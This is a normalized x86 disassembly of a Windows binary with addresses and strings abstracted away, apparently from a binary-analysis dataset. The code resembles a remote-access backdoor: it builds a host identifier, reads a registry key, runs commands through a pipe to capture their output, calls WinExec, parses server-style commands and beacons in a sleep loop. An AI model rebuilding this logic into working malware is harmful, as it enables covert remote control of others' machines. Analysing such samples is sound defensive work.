sub_401030
mov eax [ esp + 0x4 ]
push ebp
push esi
push edi
push eax
mov ebp ecx
call sub_402740
mov esi eax
push 0x400
mov [ esi + 0x320 ] 0x0
mov [ esi + 0x321 ] 0x0
mov ecx [ ebp + 0x98 ]
push 0x0
push ecx
call memset
add esp 0xc
push esi
push 0x11
mov ecx ebp
call sub_403210
push eax
lea edx [ ebp + 0x42 ]
push edx
push 0x8
mov ecx ebp
call sub_403210
push eax
push 0xa
mov ecx ebp
call sub_4031a0
mov ecx [ ebp + 0x94 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
push r--data
push ecx
call sprintf
mov edi [ ebp + 0x98 ]
add esp 0x20
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx 0x3a
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi [ ebp + 0x98 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edx [ ebp + 0x98 ]
mov eax [ ebp + 0x94 ]
push edx
push 0x0
push eax
mov ecx ebp
call sub_402890
pop edi
pop esi
mov al 0x1
pop ebp
retn 0x4
sub_401100
sub esp 0xc
push ebx
push esi
push edi
mov ebx ecx
mov eax [ ebx + 0x98 ]
push 0x400
push 0x0
push eax
call memset
add esp 0xc
push 0x11
mov ecx ebx
call sub_403210
push eax
lea ecx [ ebx + 0x42 ]
push ecx
push 0x8
mov ecx ebx
call sub_403210
push eax
push 0xa
mov ecx ebx
call sub_4031a0
push eax
mov eax [ ebx + 0x94 ]
lea edx [ ebx + 0x10 ]
push edx
push r--data
push eax
call sprintf
mov edi [ ebx + 0x98 ]
add esp 0x1c
dec edi
nop
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx 0x3a
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi [ ebx + 0x98 ]
dec edi
lea esp [ esp ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi [ esp + 0x1c ]
mov eax edi
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
call ??2@YAPAXI@Z
mov esi eax
push esi
push edi
call sub_402e30
add esp 0xc
push esi
mov ecx ebx
call sub_402740
mov ecx [ ebx + 0xa4 ]
push eax
push r--data
push ecx
call sprintf
push esi
call ??3@YAXPAX@Z
push 0x104
call ??2@YAPAXI@Z
push 0x104
mov edi eax
call ??2@YAPAXI@Z
push 0x104
mov esi eax
call ??2@YAPAXI@Z
add esp 0x1c
lea edx [ esp + 0xc ]
push edx
push 0xf003f
push 0x0
push r--data
push 0x80000001
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x24 ] 0x100
call [ RegOpenKeyExA@IAT ]
test eax eax
mov eax [ esp + 0xc ]
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push esi
lea edx [ esp + 0x1c ]
push edx
push 0x0
push r--data
push eax
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
push eax
call [ RegCloseKey@IAT ]
pop edi
pop esi
mov al 0x1
pop ebx
add esp 0xc
retn 0x4
mov eax esi
lea edx [ eax + 0x1 ]
nop
mov ecx [ esp + 0xc ]
push ecx
call [ RegCloseKey@IAT ]
pop edi
pop esi
mov al 0x1
pop ebx
add esp 0xc
retn 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x1
jbe r-xdata
push r--data
push esi
push r--data
push edi
call sprintf
mov edx [ ebx + 0x98 ]
mov eax [ ebx + 0xa4 ]
mov ecx [ ebx + 0x94 ]
add esp 0x10
push edi
push 0x0
push edx
push 0x0
push eax
push ecx
mov ecx ebx
call sub_402c70
pop edi
cmp eax 0xffffffff
pop esi
setne al
pop ebx
add esp 0xc
retn 0x4
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ eax + esi - 0x1 ] 0x3b
mov [ eax + esi ] 0x20
mov [ eax + esi + 0x1 ] cl
sub_4012f0
push esi
mov esi ecx
cmp [ esi + 0x56 ] 0x0
jne r-xdata
mov al 0x1
pop esi
retn 0x4
push ebx
mov ebx [ Sleep@IAT ]
push edi
mov edi [ esp + 0x10 ]
push edi
call ebx
cmp [ esi + 0x56 ] 0x0
je r-xdata
pop edi
pop ebx
sub_401320
push esi
mov esi ecx
call sub_402f70
push 0x32
call ??2@YAPAXI@Z
push 0x64
mov [ esi + 0xd0 ] eax
call ??2@YAPAXI@Z
add esp 0x8
mov [ esi + 0xd4 ] eax
mov al 0x1
pop esi
retn
sub_401350
push ecx
push ebx
push ebp
push esi
push edi
push 0x32
mov ebx ecx
call ??2@YAPAXI@Z
push 0x32
mov ebp eax
call ??2@YAPAXI@Z
push 0x800
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x98 ]
push 0x0
push eax
call memset
mov edi [ ebx + 0x98 ]
add esp 0x14
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx 0x3a
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi [ ebx + 0x98 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x11
mov ecx ebx
lea esi [ ebx + 0x42 ]
call sub_403210
push eax
push esi
push 0x8
mov ecx ebx
call sub_403210
push eax
push 0xa
mov ecx ebx
call sub_4031a0
mov edx [ ebx + 0x94 ]
push eax
push esi
lea ecx [ ebx + 0x10 ]
push ecx
push r--data
push edx
call sprintf
mov eax [ ebx + 0x98 ]
mov ecx [ ebx + 0x94 ]
add esp 0x20
push eax
push 0x0
push ecx
mov ecx ebx
call sub_402890
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
cmp eax 0xc8
jg r-xdata
push ebp
push r--data
push r--data
mov ecx ebx
call sub_403260
test al al
je r-xdata
mov esi [ esp + 0x10 ]
push esi
push ebp
call sub_402ee0
add esp 0x8
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_401450
push esi
push 0xc800
mov esi ecx
call ??2@YAPAXI@Z
push 0x19000
mov [ esi + 0x8 ] eax
call ??2@YAPAXI@Z
push 0x400
mov [ esi + 0xc ] eax
call ??2@YAPAXI@Z
push 0x400
mov [ esi + 0x10 ] eax
call ??2@YAPAXI@Z
mov [ esi + 0x14 ] eax
add esp 0x10
mov [ esi + 0x50 ] 0x0
mov eax esi
pop esi
retn
sub_4014b0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
push 0x2710
push 0x36ee80
push 0x0
mov esi ecx
mov ecx [ esp + 0x14 ]
push eax
push edx
mov [ esi + 0x4 ] ecx
call sub_403140
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
pop esi
retn 0x10
sub_4014f0
sub esp 0x8
push esi
lea eax [ esp + 0x4 ]
push eax
mov esi ecx
call _time64
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0xc ]
add esp 0x4
cmp ecx [ eax + 0x6c ]
pop esi
jl r-xdata
xor al al
add esp 0x8
retn
jg r-xdata
mov al 0x1
add esp 0x8
retn
mov edx [ esp ]
cmp edx [ eax + 0x68 ]
jbe r-xdata
sub_401530
mov eax 0x106c
call sub_404e90
push ebx
mov ebx [ esp + 0x107c ]
push esi
push edi
mov edi [ esp + 0x1080 ]
push ebx
xor esi esi
push esi
push edi
call memset
add esp 0xc
push esi
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x1c ]
push edx
mov [ esp + 0x28 ] 0xc
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] 0x1
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x106c
retn 0x10
lea eax [ esp + 0x24 ]
push eax
mov [ esp + 0x28 ] 0x44
call [ GetStartupInfoA@IAT ]
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x68 ]
push edx
mov [ esp + 0x68 ] eax
mov [ esp + 0x64 ] eax
lea eax [ esp + 0x28 ]
push eax
push esi
push esi
push esi
push 0x1
xor ecx ecx
push esi
mov [ esp + 0x70 ] cx
mov ecx [ esp + 0x1098 ]
push esi
push ecx
push esi
mov [ esp + 0x78 ] 0x101
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
push ebp
push edx
call [ CloseHandle@IAT ]
mov eax [ esp + 0x108c ]
mov ebp [ Sleep@IAT ]
push eax
call ebp
push ebx
push esi
push edi
mov [ esp + 0x1c ] esi
call memset
mov eax [ esp + 0x20 ]
mov ebx [ PeekNamedPipe@IAT ]
add esp 0xc
push esi
push esi
lea ecx [ esp + 0x18 ]
push ecx
push 0x1000
lea edx [ esp + 0x8c ]
push edx
push eax
call ebx
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call [ CloseHandle@IAT ]
pop ebp
cmp esi 0xb800
ja r-xdata
mov [ esi + edi ] 0x2e
inc esi
mov [ esi + edi ] 0x2e
inc esi
mov [ esi + edi ] 0x2e
mov [ esi + edi + 0x1 ] 0x0
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
jbe r-xdata
push 0xa
call ebp
mov eax [ esp + 0x14 ]
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
push 0x1000
lea edx [ esi + edi ]
push edx
push eax
call [ ReadFile@IAT ]
add esi [ esp + 0x10 ]
push 0xc8
call ebp
mov eax [ esp + 0x14 ]
push 0x0
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push 0x1000
lea edx [ esp + 0x8c ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
jmp r-xdata
sub_4016c0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
push r--data
push ebp
mov ebx ecx
call strstr
add esp 0x8
test eax eax
je r-xdata
push r--data
push ebp
call strstr
add esp 0x8
cmp eax ebp
jne r-xdata
mov eax [ ebx + 0xc ]
dec eax
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x60 ]
push r--data
push ebp
call strstr
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov dl [ r--data ]
mov [ eax + 0x4 ] dl
mov eax ebp
mov esi ebp
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
add ebp 0x4
push ebp
call atoi
add esp 0x4
mov edi eax
lea ebp [ esi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
retn 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebx + 0xc ]
sub eax esi
dec edi
mov edi edi
mov eax [ ebx + 0x8 ]
mov esi eax
push 0x104
call ??2@YAPAXI@Z
push ebp
mov esi eax
push r--data
push esi
call sprintf
mov ecx [ ebx + 0x8 ]
add esp 0x10
push edi
push 0xc800
push ecx
push esi
mov ecx ebx
call sub_401530
mov eax [ ebx + 0x8 ]
push edi
push 0xc800
push eax
push ebp
mov ecx ebx
call sub_401530
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x1 ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0xc ]
dec eax
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebx + 0xc ]
sub eax esi
dec edi
nop
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov dx [ r--data ]
mov [ eax + 0x4 ] dx
mov cl [ r--data ]
mov [ eax + 0x6 ] cl
mov eax [ ebx + 0x10 ]
dec eax
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov [ eax ] edx
mov cl [ r--data ]
mov [ eax + 0x4 ] cl
mov eax ebp
mov esi ebp
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebx + 0x10 ]
sub eax esi
dec edi
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn 0x4
mov eax [ ebx + 0xc ]
dec eax
nop
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ebx [ ebx + 0x10 ]
dec ebx
lea esp [ esp ]
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov [ eax ] edx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
mov edx [ r--data ]
mov [ eax + 0x8 ] edx
mov ecx [ r--data ]
mov [ eax + 0xc ] ecx
mov ebx [ ebx + 0x10 ]
dec ebx
nop
mov al [ ebx + 0x1 ]
inc ebx
test al al
jne r-xdata
mov edx [ r--data ]
mov [ ebx ] edx
mov ax [ r--data ]
mov [ ebx + 0x4 ] ax
mov cl [ r--data ]
push 0x0
push ebp
mov [ ebx + 0x6 ] cl
call [ WinExec@IAT ]
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn 0x4
mov al [ ebx + 0x1 ]
inc ebx
test al al
jne r-xdata
mov edx [ r--data ]
mov [ ebx ] edx
mov eax [ r--data ]
mov [ ebx + 0x4 ] eax
mov ecx [ r--data ]
mov [ ebx + 0x8 ] ecx
mov edx [ r--data ]
mov [ ebx + 0xc ] edx
sub_401920
sub esp 0x90
push ebx
mov ebx [ esp + 0x98 ]
mov eax ebx
push ebp
mov ebp ecx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x5
jae r-xdata
mov eax ebx
push esi
mov esi eax
pop ebp
xor al al
pop ebx
add esp 0x90
retn 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
sub eax esi
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
dec eax
mov edi edi
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov cx [ r--data ]
mov [ eax ] cx
mov dl [ r--data ]
mov [ eax + 0x2 ] dl
mov eax ebx
mov ecx ebx
nop
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ ebp + 0x10 ]
sub eax ecx
mov esi ecx
dec edi
nop
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x10 ]
dec eax
lea ebx [ ebx ]
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov cx [ r--data ]
mov [ eax ] cx
mov dl [ r--data ]
push 0x104
mov [ eax + 0x2 ] dl
call ??2@YAPAXI@Z
push 0x104
mov esi eax
call ??2@YAPAXI@Z
push r--data
push ebx
call strstr
add esp 0x10
cmp eax ebx
jne r-xdata
push r--data
push ebx
call strstr
add esp 0x8
cmp eax ebx
jne r-xdata
lea edi [ ebx + 0x7 ]
push r--data
push edi
call strstr
add esp 0x8
test eax eax
jne r-xdata
push r--data
push ebx
call strstr
add esp 0x8
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x30 ]
add ebx 0x5
push ebx
call eax
test al al
mov eax [ ebp + 0xc ]
je r-xdata
mov [ eax ] 0x0
inc eax
push eax
push r--data
mov ecx [ ebp + 0x4 ]
push 0x5
call sub_403210
push eax
push r--data
jmp r-xdata
push r--data
push ebx
call strstr
add esp 0x8
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebp
mov [ ecx + 0x58 ] 0x1
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
dec eax
dec eax
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
test al al
mov eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
push edi
call sub_4032a0
test al al
mov eax [ ebp + 0xc ]
je r-xdata
push esi
call sprintf
add esp 0xc
push r--data
push ebx
call strstr
mov ecx [ ebp + 0x4 ]
add esp 0x8
test eax eax
je r-xdata
push r--data
push ebx
call strstr
add esp 0x8
cmp eax ebx
jne r-xdata
mov edx [ ebp + 0x4 ]
pop edi
pop esi
pop ebp
mov [ edx + 0x58 ] 0x0
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov dx [ r--data ]
mov [ eax + 0xc ] dx
mov ebp [ ebp + 0x10 ]
dec ebp
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov cx [ r--data ]
mov [ eax + 0x8 ] cx
mov dl [ r--data ]
mov [ eax + 0xa ] dl
mov ebp [ ebp + 0x10 ]
dec ebp
dec eax
lea ebx [ ebx ]
dec eax
lea esp [ esp ]
dec eax
mov edi edi
dec eax
lea ecx [ ecx ]
push r--data
push ebx
call strstr
add esp 0x8
cmp eax ebx
jne r-xdata
lea edi [ ebx + 0x4 ]
push r--data
push edi
call strstr
add esp 0x8
cmp eax edi
jne r-xdata
mov al [ ebp + 0x1 ]
inc ebp
test al al
jne r-xdata
mov eax [ r--data ]
mov [ ebp ] eax
mov ecx [ r--data ]
mov [ ebp + 0x4 ] ecx
mov edx [ r--data ]
mov [ ebp + 0x8 ] edx
mov ax [ r--data ]
pop edi
pop esi
mov [ ebp + 0xc ] ax
pop ebp
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
mov al [ ebp + 0x1 ]
inc ebp
test al al
jne r-xdata
mov eax [ r--data ]
mov [ ebp ] eax
mov ecx [ r--data ]
mov [ ebp + 0x4 ] ecx
mov dx [ r--data ]
mov [ ebp + 0x8 ] dx
mov al [ r--data ]
pop edi
pop esi
mov [ ebp + 0xa ] al
pop ebp
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
mov ebp [ ebp + 0x10 ]
dec ebp
nop
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov dl [ r--data ]
mov [ eax + 0xc ] dl
mov ebp [ ebp + 0x10 ]
dec ebp
nop
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
mov ebp [ ebp + 0x10 ]
dec ebp
nop
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov dl [ r--data ]
mov [ eax + 0xc ] dl
mov ebp [ ebp + 0x10 ]
dec ebp
nop
push r--data
push ebx
call strstr
add esp 0x8
cmp eax ebx
jne r-xdata
add ebx 0xa
push ebx
call atoi
mov ecx [ ebp + 0x4 ]
add esp 0x4
pop edi
pop esi
pop ebp
mov [ ecx + 0x5c ] eax
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
push edi
mov ecx ebp
call sub_4016c0
pop edi
pop esi
mov [ ebp + 0x54 ] 0x0
pop ebp
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
push r--data
push edi
call strstr
add esp 0x8
test eax eax
jne r-xdata
mov al [ ebp + 0x1 ]
inc ebp
test al al
jne r-xdata
mov eax [ r--data ]
mov [ ebp ] eax
mov ecx [ r--data ]
mov [ ebp + 0x4 ] ecx
mov edx [ r--data ]
mov [ ebp + 0x8 ] edx
mov eax [ r--data ]
pop edi
pop esi
mov [ ebp + 0xc ] eax
pop ebp
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
mov al [ ebp + 0x1 ]
inc ebp
test al al
jne r-xdata
mov eax [ r--data ]
mov [ ebp ] eax
mov ecx [ r--data ]
mov [ ebp + 0x4 ] ecx
mov edx [ r--data ]
mov [ ebp + 0x8 ] edx
mov al [ r--data ]
pop edi
pop esi
mov [ ebp + 0xc ] al
pop ebp
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
mov al [ ebp + 0x1 ]
inc ebp
test al al
jne r-xdata
jmp r-xdata
mov al [ ebp + 0x1 ]
inc ebp
test al al
jne r-xdata
jmp r-xdata
push r--data
push ebx
call strstr
add esp 0x8
cmp eax ebx
jne r-xdata
add ebx 0xd
push ebx
call atoi
mov edx [ ebp + 0x4 ]
add esp 0x4
pop edi
pop esi
pop ebp
mov [ edx + 0x60 ] eax
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
mov [ eax ] 0x0
inc eax
push eax
push r--data
mov ecx [ ebp + 0x4 ]
push 0x5
call sub_403210
push eax
push r--data
jmp r-xdata
pop edi
pop esi
mov [ ebp + 0x54 ] 0x0
pop ebp
xor al al
pop ebx
add esp 0x90
retn 0x4
add ebx 0x6
push ebx
call atof
fmul [ r--data ]
fnstcw [ esp + 0x16 ]
lea ecx [ esp + 0x20 ]
movzx eax [ esp + 0x16 ]
fmul [ r--data ]
or eax 0xc00
mov [ esp + 0x18 ] eax
push ecx
fldcw [ esp + 0x1c ]
fistp [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
mov [ ebp + 0x54 ] eax
fldcw [ esp + 0x1a ]
call _time64
mov eax 0x10624dd3
xor ecx ecx
mul [ ebp + 0x54 ]
mov eax [ ebp + 0x4 ]
shr edx 0x6
add edx [ esp + 0x24 ]
adc ecx [ esp + 0x28 ]
mov [ eax + 0x68 ] edx
mov [ eax + 0x6c ] ecx
mov eax [ ebp + 0x4 ]
mov edx [ eax + 0x68 ]
mov [ esp + 0x2c ] edx
mov eax [ eax + 0x6c ]
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x38 ]
push edx
mov [ esp + 0x38 ] eax
call _localtime64_s
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x64 ]
push 0x50
push ecx
call asctime_s
mov eax [ ebp + 0xc ]
add esp 0x1c
dec eax
dec eax
dec eax
mov edi edi
push esi
call sprintf
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x4 ]
add esp 0xc
push eax
push esi
push edi
call sub_4032a0
test al al
mov eax [ ebp + 0xc ]
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov [ eax ] edx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
lea eax [ esp + 0x50 ]
mov ecx eax
nop
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
mov cx [ r--data ]
mov [ eax + 0x10 ] cx
mov eax [ ebp + 0x10 ]
dec eax
lea esp [ esp ]
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov dx [ r--data ]
mov [ eax + 0xc ] dx
mov cl [ r--data ]
mov [ eax + 0xe ] cl
mov eax [ ebp + 0x10 ]
dec eax
lea ebx [ ebx ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
mov esi ecx
dec edi
nop
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov [ eax ] edx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
mov edx [ r--data ]
mov [ eax + 0x8 ] edx
mov ecx [ r--data ]
mov [ eax + 0xc ] ecx
mov dx [ r--data ]
pop edi
mov [ eax + 0x10 ] dx
pop esi
mov [ ebp + 0x54 ] 0x0
pop ebp
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov [ eax ] edx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
mov edx [ r--data ]
mov [ eax + 0x8 ] edx
mov cx [ r--data ]
mov [ eax + 0xc ] cx
mov dl [ r--data ]
push esi
mov ecx ebp
mov [ eax + 0xe ] dl
call sub_4016c0
test al al
mov eax [ ebp + 0xc ]
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x10 ]
dec eax
lea ebx [ ebx ]
dec eax
jmp r-xdata
dec eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov [ eax ] edx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
lea eax [ esp + 0x50 ]
mov ecx eax
nop
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov cx [ r--data ]
mov [ eax + 0x8 ] cx
mov eax [ ebp + 0x10 ]
dec eax
mov edi edi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ ebp + 0x10 ]
sub eax ecx
mov esi ecx
dec edi
nop
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov dl [ r--data ]
mov [ eax + 0xc ] dl
mov eax [ ebp + 0x10 ]
dec eax
nop
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov [ eax ] edx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
mov dx [ r--data ]
pop edi
mov [ eax + 0x8 ] dx
pop esi
mov [ ebp + 0x54 ] 0x0
pop ebp
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov dl [ r--data ]
pop edi
mov [ eax + 0xc ] dl
pop esi
mov [ ebp + 0x54 ] 0x0
pop ebp
mov al 0x1
pop ebx
add esp 0x90
retn 0x4
sub_4021a0
push ecx
push ebx
push ebp
push esi
push edi
push 0x104
mov esi ecx
call ??2@YAPAXI@Z
push 0x104
mov [ esp + 0x18 ] eax
call ??2@YAPAXI@Z
push 0x104
call ??2@YAPAXI@Z
add esp 0xc
lea esp [ esp ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ ecx + 0x5c ]
mov eax [ eax + 0x2c ]
push edx
call eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
push r--data
call printf
mov ecx [ esi + 0x4 ]
add esp 0x4
push r--data
call sub_4029f0
mov eax [ esi + 0xc ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
movzx edx [ r--data ]
